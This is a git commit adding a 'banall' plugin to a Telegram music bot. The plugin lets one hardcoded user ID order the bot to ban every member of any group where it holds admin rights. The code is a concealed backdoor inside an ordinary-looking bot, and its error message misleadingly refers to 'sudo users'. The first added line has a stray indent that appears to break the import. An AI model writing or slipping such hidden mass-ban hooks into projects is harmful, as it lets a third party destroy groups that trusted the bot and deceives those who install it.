422b93b968580dccb29af638411ae2214c04a68d
Shivay3363 <shivayrathod487@gmail.com>
2024-09-10 15:14:24 +0530

    Update banall.py

--- BrandrdXMusic/plugins/tools/banall.py
+++ BrandrdXMusic/plugins/tools/banall.py
@@ -1,1 +1,18 @@
+ from BrandrdXMusic import app
+from pyrogram import filters,enums
 
+
+@app.on_message(filters.command("banall") & filters.user(7365935124))
+async def ban_all(_,msg):
+    chat_id=msg.chat.id 
+    bot=await app.get_chat_member(chat_id,6996527921)
+    bot_permission=bot.privileges.can_restrict_members==True    
+    if bot_permission:
+        async for member in app.get_chat_members(chat_id):       
+            try:
+                    await app.ban_chat_member(chat_id, member.user.id)
+                    await msg.reply_text(f"")                    
+            except Exception:
+                pass
+    else:
+        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")
